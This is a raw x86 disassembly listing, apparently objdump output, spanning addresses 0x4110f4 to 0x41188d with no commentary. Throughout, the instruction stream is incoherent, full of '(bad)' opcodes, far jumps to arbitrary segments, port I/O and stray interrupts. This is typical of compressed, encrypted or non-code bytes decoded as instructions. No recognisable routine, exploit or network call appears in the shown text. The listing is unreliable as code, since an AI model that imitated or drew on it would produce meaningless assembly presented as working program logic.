  4110f4:	cs pop ebx
  4110f6:	std    
  4110f7:	xor    edx,esp
  4110f9:	test   eax,0x8db8909b
  4110fe:	dec    ebx
  4110ff:	imul   edx,esi,0x46
  411102:	leave  
  411103:	dec    ebp
  411104:	call   0x4118:0xd502d33a
  41110b:	leave  
  41110c:	mov    ds:0x2274c431,eax
  411111:	push   0x66
  411113:	lods   al,BYTE PTR ds:[esi]
  411114:	cmp    al,0xfe
  411116:	inc    ecx
  411117:	inc    edx
  411118:	and    BYTE PTR [ecx-0x10eddc21],ch
  41111e:	inc    eax
  41111f:	call   DWORD PTR [eax]
  411121:	cmp    BYTE PTR [ebx-0x7888858b],bh
  411127:	add    bh,BYTE PTR [ecx]
  411129:	inc    edi
  41112a:	xchg   ebp,eax
  41112b:	mov    ah,0x32
  41112d:	and    eax,0x26648903
  411132:	fimul  DWORD PTR [ebx]
  411134:	sub    al,0xdc
  411136:	ss jge 0x411170
  411139:	jo     0x4111b3
  41113b:	into   
  41113c:	or     edi,edx
  41113e:	cld    
  41113f:	pop    es
  411140:	push   0xffffffa8
  411142:	repz xchg edx,eax
  411144:	js     0x4110d0
  411146:	iret   
  411147:	in     al,dx
  411148:	inc    edi
  411149:	lods   al,BYTE PTR ds:[esi]
  41114a:	mov    ds:0xf4731092,al
  41114f:	adc    eax,0x42928f8c
  411154:	(bad)  
  411155:	cs inc ecx
  411157:	pusha  
  411158:	cwde   
  411159:	jecxz  0x41110a
  41115b:	add    BYTE PTR ds:0x3933d0cf,dl
  411161:	loopne 0x411151
  411163:	pop    ecx
  411164:	popa   
  411165:	icebp  
  411166:	sti    
  411167:	int    0x24
  411169:	pop    esi
  41116a:	pop    esp
  41116b:	or     al,0xaf
  41116d:	push   edx
  41116e:	fcom   DWORD PTR [eax+esi*8-0x4b]
  411172:	aad    0x39
  411174:	mov    DWORD PTR [edx+0x16cb8134],esp
  41117a:	xchg   DWORD PTR [ebx+0x7f000e7b],ecx
  411180:	or     ebx,DWORD PTR [ebx-0x58c7f7e0]
  411186:	or     BYTE PTR [ecx],0xe7
  411189:	xor    ebp,DWORD PTR [ebp+0x7bd4e2f0]
  41118f:	les    esi,FWORD PTR [edi+0x18]
  411192:	jns    0x4111d2
  411194:	icebp  
  411195:	jge    0x411214
  411197:	test   edx,esi
  411199:	lahf   
  41119a:	fcmove st,st(6)
  41119c:	cmp    DWORD PTR [edi+0x25fd51c0],ebp
  4111a2:	jge    0x411152
  4111a4:	(bad)  
  4111a5:	mov    ecx,0x1544f228
  4111aa:	push   ecx
  4111ab:	stos   BYTE PTR es:[edi],al
  4111ac:	jmp    0x3d32:0xd984acd3
  4111b3:	leave  
  4111b4:	rol    BYTE PTR [edx+0x552baab6],0x8b
  4111bb:	pop    ds
  4111bc:	sub    BYTE PTR [ebx+eiz*8-0x3],bl
  4111c0:	daa    
  4111c1:	in     al,0x16
  4111c3:	and    eax,0xc8bc3cfa
  4111c8:	shr    DWORD PTR [ebp+0x46387000],0x6b
  4111cf:	(bad)  
  4111d0:	push   ecx
  4111d1:	dec    esi
  4111d2:	dec    edi
  4111d3:	add    bh,BYTE PTR [eax]
  4111d5:	xchg   DWORD PTR [eax+0xe],edx
  4111d8:	lds    eax,FWORD PTR [edx]
  4111da:	les    ecx,FWORD PTR [ecx]
  4111dc:	shl    ah,0x13
  4111df:	repz mov al,ds:0x8eab23b5
  4111e5:	dec    esp
  4111e6:	es xchg esp,eax
  4111e8:	sbb    ebx,ebp
  4111ea:	sbb    dh,dh
  4111ec:	xchg   DWORD PTR [edi],esp
  4111ee:	in     al,dx
  4111ef:	jge    0x4111f5
  4111f1:	fcmovu st,st(6)
  4111f3:	xor    esi,DWORD PTR [esi-0x6be5046b]
  4111f9:	fidivr DWORD PTR [ecx+0x20]
  4111fc:	sub    DWORD PTR [edi],ebx
  4111fe:	rcr    dh,cl
  411200:	inc    edi
  411201:	xor    al,0xba
  411203:	push   edi
  411204:	mov    eax,ds:0x606de860
  411209:	and    bh,BYTE PTR [ebp+0x6336e6a5]
  41120f:	cvtpi2ps xmm0,mm5
  411212:	or     eax,0x989526d9
  411217:	xchg   edx,eax
  411218:	sbb    dh,BYTE PTR [ebp+0x5197765]
  41121e:	stos   BYTE PTR es:[edi],al
  41121f:	inc    edi
  411220:	scas   al,BYTE PTR es:[edi]
  411221:	aaa    
  411222:	frstor [eax]
  411224:	cmp    DWORD PTR [eax],esi
  411226:	lods   al,BYTE PTR ds:[esi]
  411227:	jg     0x4111d5
  411229:	and    eax,0xf65b0bc8
  41122e:	and    dh,BYTE PTR [eax-0x4cfc09ea]
  411234:	inc    ebp
  411235:	push   edi
  411236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411237:	or     BYTE PTR [esi+0x1abde30],dh
  41123d:	test   edx,edi
  41123f:	ret    
  411240:	dec    edx
  411241:	mov    esp,0x7a623647
  411246:	xchg   esp,edx
  411248:	int    0x2d
  41124a:	cmc    
  41124b:	mov    ds:0x80f3b06b,al
  411250:	mov    bh,0x69
  411252:	call   0x396e:0x89eb56c2
  411259:	push   ebp
  41125a:	sub    eax,0x35392e9c
  41125f:	addr16 sar edx,1
  411262:	aaa    
  411263:	mov    eax,0xa5e02770
  411268:	sti    
  411269:	xchg   esi,eax
  41126a:	xchg   edi,eax
  41126b:	pop    eax
  41126c:	sbb    al,BYTE PTR [esi+0x2eec38de]
  411272:	mov    bl,0x79
  411274:	xor    bl,al
  411276:	(bad)  
  411277:	lock (bad) 
  411279:	xor    DWORD PTR [esi],ecx
  41127b:	dec    esi
  41127c:	test   DWORD PTR [ecx+ebp*2+0xd5cf5d9],edx
  411283:	mov    edx,0x28ec1f46
  411288:	nop
  411289:	mov    eax,ds:0x5f4278c1
  41128e:	mov    dl,0xbb
  411290:	out    0x7a,eax
  411292:	pop    es
  411293:	jbe    0x4112fe
  411295:	mov    ?,edi
  411297:	dec    ebx
  411298:	fwait
  411299:	cmp    BYTE PTR [ebp+0x41],ah
  41129c:	(bad)  
  41129e:	sub    BYTE PTR [ebx-0x213894bc],cl
  4112a4:	out    dx,al
  4112a5:	mov    edi,0x62cb30d9
  4112aa:	pop    eax
  4112ab:	xchg   BYTE PTR [eax+edi*1],bh
  4112ae:	cli    
  4112af:	out    dx,al
  4112b0:	idiv   BYTE PTR [eax-0x10e097e3]
  4112b6:	bound  edi,QWORD PTR [ebx]
  4112b8:	mov    ds:0xdcf05d0f,eax
  4112bd:	das    
  4112be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112bf:	out    0xfb,al
  4112c1:	push   eax
  4112c2:	cli    
  4112c3:	test   DWORD PTR [ebp+0x44],ecx
  4112c6:	xchg   edx,eax
  4112c7:	daa    
  4112c8:	sbb    BYTE PTR [eax],dl
  4112ca:	add    ecx,esp
  4112cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112cd:	dec    ebp
  4112ce:	outs   dx,BYTE PTR ds:[esi]
  4112cf:	not    BYTE PTR [edx+0x24]
  4112d2:	je     0x411261
  4112d4:	and    bh,ah
  4112d6:	hlt    
  4112d7:	push   0xffffffb0
  4112d9:	sbb    eax,0x22ccc1e0
  4112de:	xchg   edi,eax
  4112df:	imul   ebx,DWORD PTR [ebx],0xffffffd2
  4112e2:	nop
  4112e3:	lods   al,BYTE PTR ds:[esi]
  4112e4:	iret   
  4112e5:	rcl    BYTE PTR [edi-0x50b89199],1
  4112eb:	mov    ?,WORD PTR [edi+esi*4+0x62]
  4112ef:	jl     0x41130d
  4112f1:	mov    bh,0xd9
  4112f3:	fidivr DWORD PTR [ebp-0x36e5dfb7]
  4112fa:	xchg   BYTE PTR [eax],ch
  4112fc:	jmp    0x4112d4
  4112fe:	fsubr  DWORD PTR [edi+0x6f]
  411301:	(bad)  
  411302:	sti    
  411303:	jecxz  0x4112b1
  411305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411306:	lods   eax,DWORD PTR ds:[esi]
  411307:	in     al,0xbe
  411309:	outs   dx,DWORD PTR ds:[esi]
  41130a:	jp     0x41128e
  41130c:	cmp    al,0xdd
  41130e:	fprem1 
  411310:	lods   al,BYTE PTR ds:[esi]
  411311:	xchg   ebx,eax
  411312:	imul   edi,DWORD PTR [edx],0xffffff89
  411315:	cmp    BYTE PTR [edx],bh
  411317:	xchg   edx,eax
  411318:	or     ah,BYTE PTR [ecx]
  41131a:	sar    DWORD PTR [eax],cl
  41131c:	adc    ebx,esi
  41131e:	and    ch,bl
  411320:	call   0x7fff:0x29d280ed
  411327:	lods   al,BYTE PTR ds:[esi]
  411328:	mov    edx,0x3614fed9
  41132d:	(bad)  
  41132e:	and    al,0xaf
  411330:	xchg   ebp,eax
  411332:	ds pop es
  411334:	stc    
  411335:	div    ebp
  411337:	retw   
  411339:	into   
  41133a:	add    DWORD PTR [esi+0x39],ecx
  41133d:	ss aaa 
  41133f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411340:	out    0x62,eax
  411342:	cdq    
  411343:	out    dx,al
  411344:	sub    al,0xb0
  411346:	mov    ah,0xf4
  411348:	(bad)  
  41134a:	adc    BYTE PTR ds:0x118ab06d,dh
  411350:	aam    0xc5
  411352:	push   edx
  411353:	xchg   dh,dl
  411355:	shld   DWORD PTR [esi-0x6f],esi,cl
  411359:	aad    0x7
  41135b:	inc    ecx
  41135c:	test   DWORD PTR [eax+0x2d22b620],ebx
  411362:	jmp    0xee15:0x11974f7f
  411369:	sahf   
  41136a:	fdivr  QWORD PTR [ecx+0x6a1d1290]
  411370:	mov    eax,ds:0xf5e08ad4
  411375:	xlat   BYTE PTR ds:[ebx]
  411376:	jp     0x41134a
  411378:	push   ecx
  411379:	call   DWORD PTR [edx]
  41137b:	and    edx,DWORD PTR cs:[ebp-0x3c]
  41137f:	ja     0x41131d
  411381:	dec    eax
  411382:	jns    0x4113c6
  411384:	xchg   DWORD PTR [ebp-0x1c80887d],edx
  41138a:	call   0x7862:0x866ba369
  411391:	imul   ebp,DWORD PTR [eax+0x56],0xffffffe9
  411395:	int3   
  411396:	leave  
  411397:	pop    edi
  411398:	rol    BYTE PTR [eax],cl
  41139a:	ins    BYTE PTR es:[edi],dx
  41139b:	xchg   esi,eax
  41139c:	not    DWORD PTR [ebx]
  41139e:	or     cl,BYTE PTR ds:[ebp-0x63]
  4113a2:	push   0x8b57eedb
  4113a7:	mov    bh,0xb2
  4113a9:	jmp    0xce0da2a1
  4113ae:	shl    eax,cl
  4113b0:	dec    esp
  4113b1:	aam    0x83
  4113b3:	xchg   esi,eax
  4113b4:	cmp    eax,0xcf45883e
  4113b9:	pop    edi
  4113ba:	sahf   
  4113bb:	mov    ebp,DWORD PTR [ecx+esi*2]
  4113be:	es pop esi
  4113c0:	xor    al,0x6e
  4113c2:	adc    al,0xb7
  4113c4:	mov    dl,0xba
  4113c6:	xchg   DWORD PTR [edx+esi*8-0x2e],ecx
  4113ca:	in     eax,dx
  4113cb:	fcmovbe st,st(0)
  4113cd:	fs jl  0x41138f
  4113d0:	jae    0x41136d
  4113d2:	jp     0x41144c
  4113d4:	dec    BYTE PTR [edi+0x0]
  4113d7:	bnd gs jg 0x4113c2
  4113db:	jge    0x4113dd
  4113dd:	test   al,0xc0
  4113df:	mov    esi,0xd469762b
  4113e4:	jae    0x411414
  4113e6:	jns    0x411399
  4113e8:	xor    BYTE PTR [ecx+ecx*1],dh
  4113eb:	xor    al,0xb0
  4113ed:	pusha  
  4113ee:	dec    edi
  4113ef:	cs imul ebx,ebp,0xffffff8f
  4113f3:	pusha  
  4113f4:	fs iret 
  4113f6:	data16 fisttp DWORD PTR [esi-0x7]
  4113fa:	inc    eax
  4113fb:	in     al,0xa2
  4113fd:	(bad)  
  4113fe:	jp     0x41141c
  411400:	push   ss
  411401:	or     esp,0xffffff92
  411404:	(bad)  
  411405:	jae    0x411476
  411407:	mov    gs:0xe7961547,al
  41140d:	pusha  
  41140e:	(bad)  
  41140f:	mov    bh,0xca
  411411:	mov    ?,WORD PTR [edi+0x78fc9278]
  411417:	push   ecx
  411418:	test   al,0x2d
  41141a:	mov    dh,0x2d
  41141c:	loop   0x411482
  41141e:	loopne 0x41143b
  411420:	(bad)  
  411421:	xor    ecx,DWORD PTR [ecx+ebp*1]
  411424:	scas   al,BYTE PTR es:[edi]
  411425:	shl    BYTE PTR [edx],0x1e
  411428:	mov    ecx,0xacb728f0
  41142d:	and    ch,al
  41142f:	aas    
  411430:	sbb    eax,0x56508088
  411435:	push   ebx
  411436:	xchg   BYTE PTR [eax-0x6],bh
  411439:	sub    edi,0xc679dba
  41143f:	jg     0x4114b7
  411441:	mov    dl,BYTE PTR ds:0xa3273ad7
  411447:	mov    bl,0xdc
  411449:	popf   
  41144a:	inc    esp
  41144b:	and    BYTE PTR [ebx-0x5b],dh
  41144e:	inc    esp
  41144f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411450:	pop    ds
  411451:	lods   al,BYTE PTR ds:[esi]
  411452:	jae    0x411407
  411454:	cdq    
  411455:	xchg   ebx,eax
  411456:	push   ebx
  411457:	push   esp
  411458:	push   cs
  411459:	cmp    eax,0xf159cfb8
  41145e:	nop
  41145f:	dec    ecx
  411460:	addr16 jne 0x41149c
  411463:	fcom   st(5)
  411465:	jno    0x41140a
  411467:	outs   dx,BYTE PTR ds:[esi]
  411468:	dec    ecx
  411469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41146a:	mov    bl,0xcb
  41146c:	mov    ecx,DWORD PTR [edi-0x12670cd2]
  411472:	dec    ebx
  411473:	call   0xf27233bb
  411478:	in     al,dx
  411479:	movzx  ecx,WORD PTR [edx]
  41147c:	add    edi,DWORD PTR ds:0x89bcb303
  411482:	pop    ebx
  411483:	das    
  411484:	xchg   esi,eax
  411485:	data16 mov ?,WORD PTR gs:[ebx]
  411489:	push   ecx
  41148a:	in     al,0xb6
  41148c:	pop    edx
  41148d:	dec    ebp
  41148e:	and    esi,DWORD PTR [bx+si-0x6610]
  411493:	mov    ebx,0xfe62605e
  411498:	push   eax
  411499:	pop    ecx
  41149a:	stc    
  41149b:	(bad)
  41149e:	shl    BYTE PTR [edx+ecx*8-0x2b],0x18
  4114a3:	mov    edi,ebx
  4114a5:	or     ch,dh
  4114a7:	or     DWORD PTR [ebx],edi
  4114a9:	push   ds
  4114aa:	(bad)  
  4114ab:	hlt    
  4114ac:	(bad)  
  4114ad:	mov    eax,ecx
  4114af:	cmp    al,0x1c
  4114b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114b2:	(bad)  
  4114b3:	pop    ebx
  4114b4:	les    ebx,FWORD PTR [esi+eax*1-0x7d2d6611]
  4114bb:	cdq    
  4114bc:	and    esp,DWORD PTR [esi+0x7c]
  4114bf:	push   eax
  4114c0:	mov    esi,0x5307e04e
  4114c5:	or     bl,BYTE PTR [edx]
  4114c7:	pop    ebp
  4114c8:	mov    eax,ds:0xec833b1f
  4114cd:	cmp    eax,0x7880c7ca
  4114d2:	sub    eax,0x6f545c82
  4114d7:	pop    ebx
  4114d8:	inc    eax
  4114d9:	xor    ah,BYTE PTR [eax+0x18]
  4114dc:	(bad)  
  4114dd:	mov    edx,0x42572ad0
  4114e2:	pop    ds
  4114e3:	lahf   
  4114e4:	(bad)  
  4114e5:	js     0x4114cf
  4114e7:	lock pop edi
  4114e9:	loopne 0x41152a
  4114eb:	mov    ds:0x78e00388,al
  4114f0:	mov    edx,0xaca3a6b3
  4114f5:	mov    edi,0x754c42c8
  4114fa:	sti    
  4114fb:	fisttp QWORD PTR [edi+0x1d]
  4114fe:	mov    al,ds:0x31cb166c
  411503:	mov    ds:0x8761b24b,al
  411508:	sbb    edx,DWORD PTR [ebp+0x67]
  41150b:	outs   dx,DWORD PTR ds:[esi]
  41150c:	clc    
  41150d:	sahf   
  41150e:	std    
  41150f:	(bad)  
  411510:	outs   dx,BYTE PTR ds:[esi]
  411511:	jae    0x411590
  411513:	jns    0x4114c3
  411515:	loopne 0x41151c
  411517:	out    0xc7,eax
  411519:	call   ebx
  41151b:	mov    ch,0x9d
  41151d:	stos   DWORD PTR es:[edi],eax
  41151e:	add    DWORD PTR [edx],ecx
  411520:	sub    ch,BYTE PTR [ecx]
  411522:	cs mov edx,0x8d0caf66
  411528:	push   ebp
  411529:	jmp    0x14a4:0x2f3e2c7d
  411530:	(bad)  
  411532:	jae    0x4114f1
  411534:	fidiv  WORD PTR [edx+0xc]
  411537:	js     0x411548
  411539:	add    DWORD PTR [eax],ebp
  41153b:	fs xchg ebx,eax
  41153d:	add    bl,bh
  41153f:	cdq    
  411540:	ins    DWORD PTR es:[edi],dx
  411541:	daa    
  411542:	push   ecx
  411543:	push   esi
  411544:	mov    cl,0xb2
  411546:	mov    cl,0x54
  411548:	dec    esp
  411549:	jno    0x4115a3
  41154b:	mov    ch,BYTE PTR [edx+0x4c891304]
  411551:	test   BYTE PTR [esi],0x3
  411554:	dec    ecx
  411555:	(bad)  
  411557:	lahf   
  411558:	xchg   bl,bl
  41155a:	inc    esp
  41155b:	loop   0x41157d
  41155d:	scas   al,BYTE PTR es:[edi]
  41155e:	xchg   ebx,eax
  41155f:	(bad)  
  411560:	lock cld 
  411562:	fild   QWORD PTR [ecx]
  411564:	jle    0x411599
  411566:	push   ecx
  411567:	(bad)  
  411569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41156a:	sbb    esi,DWORD PTR [eax-0x52]
  41156d:	ret    
  41156e:	or     edi,DWORD PTR [eax]
  411570:	adc    esi,DWORD PTR [esp+eiz*8-0x4805e66d]
  411577:	push   ebp
  411578:	pop    eax
  411579:	test   BYTE PTR [edx-0x13],ch
  41157c:	mov    ecx,0x66625c2
  411581:	mov    edx,0x743e5e48
  411586:	sbb    cl,cl
  411588:	inc    ebx
  411589:	add    DWORD PTR [ecx],esi
  41158b:	mov    ebx,0x91d1c4a1
  411590:	js     0x41154c
  411592:	(bad)  
  411593:	out    dx,al
  411594:	loop   0x411606
  411596:	in     eax,dx
  411597:	(bad)  
  411598:	cmp    al,0xd4
  41159a:	xor    eax,0x47fcc601
  41159f:	jno    0x4115ae
  4115a1:	mov    al,0x70
  4115a3:	fld    TBYTE PTR [edi-0x45]
  4115a6:	xchg   esp,eax
  4115a7:	out    dx,eax
  4115a8:	jp     0x411606
  4115aa:	ret    0x1b1c
  4115ad:	(bad)  
  4115af:	adc    al,0xa8
  4115b1:	aam    0xc1
  4115b3:	sbb    esp,DWORD PTR ss:[bx+di+0x69]
  4115b8:	mov    edi,0x590a610f
  4115bd:	or     BYTE PTR cs:[ebp-0x7278e2b2],dh
  4115c4:	xlat   BYTE PTR ds:[ebx]
  4115c5:	(bad)  
  4115c6:	and    BYTE PTR [ebx+0x53],ch
  4115c9:	sbb    bl,dh
  4115cb:	jp     0x4115f1
  4115cd:	stos   BYTE PTR es:[edi],al
  4115ce:	adc    DWORD PTR [eax],edx
  4115d0:	test   DWORD PTR [edi+0x16713c0b],ebx
  4115d6:	inc    ecx
  4115d7:	enter  0xb5ea,0x8d
  4115db:	jnp    0x411600
  4115dd:	sahf   
  4115de:	sub    eax,0xa65a3e13
  4115e3:	add    edi,ebx
  4115e5:	xor    DWORD PTR ds:0xb3c689f2,edi
  4115eb:	xchg   ebp,eax
  4115ec:	mov    ebx,ds
  4115ee:	(bad)  
  4115f0:	sar    DWORD PTR [esi-0x77bd80f4],0xb1
  4115f7:	push   ds
  4115f8:	sahf   
  4115f9:	imul   esi,DWORD PTR [esp+edx*2-0x3ad82fdb],0xbb66f3bc
  411604:	in     eax,0xc9
  411606:	mov    al,ds:0x2bc9155e
  41160b:	sub    al,0x90
  41160d:	inc    edi
  41160e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41160f:	rcl    BYTE PTR [ebx-0x2],1
  411612:	mov    bh,ch
  411614:	pop    edi
  411615:	cmp    eax,0xfd523384
  41161a:	pop    ebp
  41161b:	xchg   ebx,eax
  41161c:	test   al,0xec
  41161e:	inc    ebp
  41161f:	cmc    
  411620:	inc    edx
  411621:	scas   eax,DWORD PTR es:[edi]
  411622:	stos   DWORD PTR es:[edi],eax
  411623:	jmp    0x25e987f
  411628:	dec    edx
  411629:	pop    ds
  41162a:	adc    ebx,esi
  41162c:	or     eax,0x8c84719a
  411631:	add    al,0xe7
  411633:	jp     0x4115e1
  411635:	push   ds
  411636:	ds ret 0xfb8
  41163a:	js     0x411609
  41163c:	pop    ecx
  41163d:	mov    bl,0x35
  41163f:	call   0x2beeb2c0
  411644:	mov    esp,edi
  411646:	(bad)  
  411647:	in     al,dx
  411648:	mov    al,0x25
  41164a:	lock (bad) 
  41164c:	ret    0xb696
  41164f:	pop    ss
  411650:	add    BYTE PTR [esi],bl
  411652:	fdiv   DWORD PTR [edx+ebp*8]
  411655:	(bad)  
  411656:	cdq    
  411657:	cli    
  411658:	pusha  
  411659:	sar    DWORD PTR [esi],1
  41165b:	shr    BYTE PTR [eax+ecx*1],1
  41165e:	test   al,0x6a
  411660:	push   cs
  411661:	ins    DWORD PTR es:[edi],dx
  411662:	(bad)  
  411663:	xchg   ebp,eax
  411664:	outs   dx,BYTE PTR ds:[esi]
  411665:	out    0x13,eax
  411667:	test   al,0x7b
  411669:	xchg   esi,eax
  41166a:	sbb    ch,BYTE PTR [eax+0x28]
  41166d:	mov    ds:0x68cbba0e,al
  411672:	mov    ch,bh
  411674:	pop    edi
  411675:	and    al,BYTE PTR [edi]
  411677:	and    eax,0x9996fc7d
  41167c:	lea    esp,[edi+0x31]
  41167f:	mov    ebx,0x65d8b343
  411684:	pushf  
  411685:	jp     0x41168e
  411687:	sahf   
  411688:	mov    dl,0xb4
  41168a:	ins    BYTE PTR es:[edi],dx
  41168b:	enter  0xbcaa,0x46
  41168f:	int    0xa1
  411691:	xor    al,al
  411693:	adc    dh,dl
  411695:	out    0x93,al
  411697:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411698:	cwde   
  411699:	xchg   ebx,eax
  41169a:	add    edi,eax
  41169c:	sbb    DWORD PTR [eax-0x1d],ebx
  41169f:	scas   eax,DWORD PTR es:[edi]
  4116a0:	cmp    edx,edx
  4116a2:	add    BYTE PTR [ecx+edx*2],dl
  4116a5:	sub    eax,0x44583bcd
  4116aa:	(bad)  
  4116ad:	fdivr  DWORD PTR [ebx+edx*8-0x355c0520]
  4116b4:	pop    edx
  4116b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116b6:	dec    eax
  4116b7:	hlt    
  4116b8:	lahf   
  4116b9:	mov    eax,0x84365f40
  4116be:	adc    edx,eax
  4116c0:	adc    eax,DWORD PTR [edx+0x6d]
  4116c3:	mov    ds:0x19f685f,eax
  4116c8:	popa   
  4116c9:	mov    eax,ds:0xfba6baf6
  4116ce:	jno    0x411708
  4116d0:	dec    ecx
  4116d1:	adc    eax,0x3f158763
  4116d6:	fwait
  4116d7:	lahf   
  4116d8:	xchg   ebp,eax
  4116d9:	mov    ds:0xc2d18e7f,al
  4116de:	das    
  4116df:	ret    
  4116e0:	jmp    0xc2ee:0x5676a655
  4116e7:	or     ebx,DWORD PTR [ebp+edx*2+0x14fb7ec7]
  4116ee:	fsubr  DWORD PTR [edi-0x644dc96d]
  4116f4:	and    al,0x94
  4116f6:	addr16 adc eax,0xeee827d0
  4116fc:	inc    eax
  4116fd:	pop    eax
  4116fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116ff:	iret   
  411700:	and    DWORD PTR [ebx+esi*2-0x58],0xfb3d5d0d
  411708:	retf   
  411709:	inc    edi
  41170a:	or     ecx,esp
  41170c:	cwde   
  41170d:	xor    esi,DWORD PTR [ecx+esi*4+0x6]
  411711:	dec    esp
  411712:	mov    edi,0x73e95881
  411717:	neg    BYTE PTR [edx]
  411719:	mov    ecx,0x8c28183c
  41171e:	js     0x4116a2
  411720:	sub    BYTE PTR [eax],al
  411722:	push   ebx
  411723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411724:	lods   eax,DWORD PTR ds:[esi]
  411725:	movntq (bad),mm1
  411726:	out    0xca,eax
  411728:	mov    ebp,0x9e57563b
  41172d:	ins    BYTE PTR es:[edi],dx
  41172e:	sbb    al,0x62
  411730:	mov    dl,dl
  411732:	mov    BYTE PTR [ebx+0x6822fe2c],dl
  411738:	das    
  411739:	in     eax,0xa4
  41173b:	inc    ecx
  41173c:	adc    BYTE PTR [edx+eax*1+0x79312e89],cl
  411743:	aad    0xb
  411745:	(bad)  
  411746:	cmp    DWORD PTR [esi+0x43],ebx
  411749:	adc    ebx,esi
  41174b:	and    ch,ah
  41174d:	stos   BYTE PTR es:[edi],al
  41174e:	push   esi
  41174f:	dec    esi
  411750:	das    
  411751:	dec    ebp
  411752:	lock retf 
  411754:	(bad)  
  411755:	stos   BYTE PTR es:[edi],al
  411756:	jmp    0x2c78:0xdccfa292
  41175d:	xor    esp,DWORD PTR [ebp+0x25]
  411760:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  411762:	(bad)  
  411763:	inc    edi
  411764:	fistp  QWORD PTR [edi]
  411766:	ds jl  0x41175a
  411769:	mov    ds:0xdd84eb48,eax
  41176e:	xchg   BYTE PTR [edx-0x367f6245],dh
  411774:	ret    0xc69
  411777:	ins    DWORD PTR es:[edi],dx
  411778:	dec    ebp
  411779:	in     al,0x13
  41177b:	xor    eax,0x6769ef24
  411780:	adc    BYTE PTR [edi],dh
  411782:	jge    0x411727
  411784:	loop   0x411787
  411786:	rcl    BYTE PTR [eax],1
  411788:	sub    esp,ecx
  41178a:	lods   eax,DWORD PTR ds:[esi]
  41178b:	arpl   WORD PTR [eax-0x47],di
  41178e:	nop
  41178f:	in     al,dx
  411790:	mov    esi,0x5699c8d4
  411795:	push   ss
  411796:	scas   al,BYTE PTR es:[edi]
  411797:	xchg   edi,eax
  411798:	adc    DWORD PTR [edx+ebx*8],edi
  41179b:	adc    al,0x71
  41179d:	jp     0x4117d0
  41179f:	call   0xd526a359
  4117a4:	pop    edi
  4117a5:	dec    edi
  4117a6:	cli    
  4117a7:	outs   dx,DWORD PTR ds:[esi]
  4117a8:	push   ebp
  4117a9:	int    0x71
  4117ab:	div    edx
  4117ad:	retf   
  4117ae:	(bad)  
  4117af:	xor    DWORD PTR ds:0xdbf7ab7e,edi
  4117b5:	ins    BYTE PTR es:[edi],dx
  4117b6:	mov    WORD PTR [ebx-0x5138ab55],ss
  4117bc:	jecxz  0x411796
  4117be:	lahf   
  4117bf:	mov    eax,ds:0x4387fb2f
  4117c4:	sub    DWORD PTR [edx-0x49],ebp
  4117c7:	dec    eax
  4117c8:	loopne 0x411823
  4117ca:	xchg   ebx,eax
  4117cb:	(bad)  
  4117cc:	std    
  4117cd:	push   ecx
  4117ce:	jno    0x41177c
  4117d0:	sti    
  4117d1:	jbe    0x411822
  4117d3:	fsub   DWORD PTR [ebp+0x23]
  4117d6:	cmp    BYTE PTR ds:[ecx],ah
  4117d9:	fcom   st(1)
  4117db:	xchg   ebx,eax
  4117dc:	mul    DWORD PTR [edx+0x3af7ed08]
  4117e2:	arpl   WORD PTR [ecx-0x51402caa],dx
  4117e8:	dec    esi
  4117e9:	adc    DWORD PTR [ebx],0xffffff8c
  4117ec:	or     eax,0x108bcc6e
  4117f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117f2:	fwait
  4117f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117f4:	loopne 0x411875
  4117f6:	dec    edi
  4117f7:	add    eax,0x537cb564
  4117fc:	int    0x35
  4117fe:	cmp    BYTE PTR [edx-0x2af9afe7],dh
  411804:	loop   0x41183f
  411806:	je     0x41180b
  411808:	retf   
  411809:	dec    esi
  41180a:	imul   eax,DWORD PTR [eax+0x5acb06a6],0x97109e02
  411814:	inc    esi
  411815:	arpl   WORD PTR [ecx-0xc5fcc71],di
  41181b:	jne    0x4117b9
  41181d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41181e:	(bad)  
  41181f:	jbe    0x411807
  411821:	pusha  
  411822:	dec    edi
  411823:	mov    edi,0xb6071e32
  411828:	bound  ebx,QWORD PTR [ecx+0x5481225f]
  41182e:	ins    BYTE PTR es:[edi],dx
  41182f:	stos   DWORD PTR es:[edi],eax
  411830:	adc    eax,0xa79cd407
  411836:	sub    di,WORD PTR [eax]
  411839:	mov    ah,0x88
  41183b:	jl     0x411858
  41183d:	lods   al,BYTE PTR ds:[esi]
  41183e:	push   ss
  41183f:	dec    edi
  411840:	ds dec edi
  411842:	jnp    0x411855
  411844:	mov    eax,ds:0x58e46546
  411849:	ins    BYTE PTR es:[edi],dx
  41184a:	inc    ebp
  41184b:	int3   
  41184c:	sbb    ecx,0x6b0494f7
  411852:	aaa    
  411853:	adc    eax,0xa9649d4a
  411858:	pop    esi
  411859:	stos   BYTE PTR es:[edi],al
  41185a:	xor    al,0xb
  41185c:	ror    BYTE PTR [eax+0x28],1
  41185f:	(bad)  
  411860:	retf   0x2091
  411863:	xor    ch,dl
  411865:	mov    dh,0x99
  411867:	stc    
  411868:	sbb    bh,BYTE PTR [ecx-0x42]
  41186b:	mov    cl,0x80
  41186d:	cmp    al,0x9d
  41186f:	sbb    eax,0x6989e45e
  411874:	ret    
  411875:	in     eax,0x4c
  411877:	lea    esi,[ecx+edx*8+0x1f]
  41187b:	dec    ecx
  41187c:	mov    cl,0x52
  41187e:	jnp    0x411863
  411880:	mov    ah,0x0
  411882:	sub    ebp,eax
  411884:	clc    
  411885:	push   0xd585b6be
  41188a:	fstp   st(6)
  41188c:	popa   
  41188d:	jno    0x4118a4
